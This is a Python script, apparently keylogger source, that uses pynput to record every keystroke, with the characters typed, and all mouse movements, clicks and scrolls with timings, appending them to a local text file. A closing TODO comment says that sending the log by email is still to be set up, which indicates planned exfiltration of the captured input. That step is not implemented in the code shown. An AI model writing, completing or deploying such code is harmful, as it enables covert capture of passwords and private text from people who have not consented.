from pynput import mouse,keyboard
import threading
from time import time

t_inicial=time()

def escribir(dispositivo, accion, t_final, colocacion):
    global t_inicial
    n_archivo="lista_acciones.txt"
    archivo=open(n_archivo,"a")
    tiempo=round(t_final-t_inicial,2)
    archivo.write(dispositivo + "," + accion + "," + str(tiempo) + "," + colocacion + "\n")
    archivo.close()
    t_inicial = time()


def on_move(x, y):
    colocacion = ('{0},{1}'.format(x, y))
    escribir("Mouse","Moved",time(),colocacion)
    print(colocacion)

def on_click(x, y, button, pressed):
    accion="{0}".format('Pressed' if pressed else 'Released')
    escribir("Mouse",accion,time(),str(button))

def on_scroll(x, y, dx, dy):
    colocacion=('{0}'.format('Down' if dy < 0 else 'Up'))
    escribir("Mouse","Scrolled",time(),colocacion)

def on_press(key):
    try:
        escribir("Keyboard", "Pressed", time(), key.char)
    except AttributeError:
        escribir("Keyboard", "Pressed", time(), str(key))

def on_release(key):
    try:
        escribir("Keyboard", "Release", time(), key.char)
    except AttributeError:
        escribir("Keyboard", "Release", time(), str(key))


listener_keyboard= keyboard.Listener(
        on_press=on_press,
        on_release=on_release)
listener_keyboard.setDaemon(True)

listener_mouse= mouse.Listener(
        on_move=on_move,
        on_click=on_click,
        on_scroll=on_scroll)
listener_mouse.setDaemon(True)

listener_keyboard.start()
listener_mouse.start()

hilo_ppal = threading.main_thread() # Obtiene hilo principal

for hilo in threading.enumerate(): # Recorre hilos activos para controlar estado de su ejecución
    if hilo is hilo_ppal:    # Si el hilo es hilo_ppal continua al siguiente hilo activo
        continue
    hilo.join()         # El programa esperará a que este hilo finalice:

#TODO: falta configurar el envio al correo electronico